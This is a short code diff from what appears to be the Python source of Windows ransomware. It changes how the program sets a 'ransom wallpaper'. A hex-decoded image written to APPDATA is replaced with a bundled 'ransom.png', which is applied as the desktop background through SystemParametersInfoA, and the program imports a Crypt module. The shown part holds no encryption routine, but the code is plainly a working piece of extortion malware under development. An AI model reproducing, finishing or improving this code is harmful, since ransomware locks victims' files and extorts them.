@@ -13,7 +13,6 @@ import win32event
 # Import classes
 import Crypt
 import Base
-import image as image_handle
 
 
 ################
@@ -148,12 +147,8 @@ class Main(Base.Base):
     # Function to set the ransom wallpaper
 
     # Import image and write to path
-    image = image_handle.image()
-    image = image.image_string.decode('hex')
-    image_path = os.path.join(os.environ['APPDATA'], "note.png")
-    fh = open(image_path, "wb")
-    fh.write(image)
-    fh.close()
+    # todo adjust file name... maybe replace this with whatever is provided in the config file?
+    image_path = os.path.join(sys._MEIPASS, "ransom.png")
 
     SPI_SETDESKWALLPAPER = 20
     ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, image_path, 3)
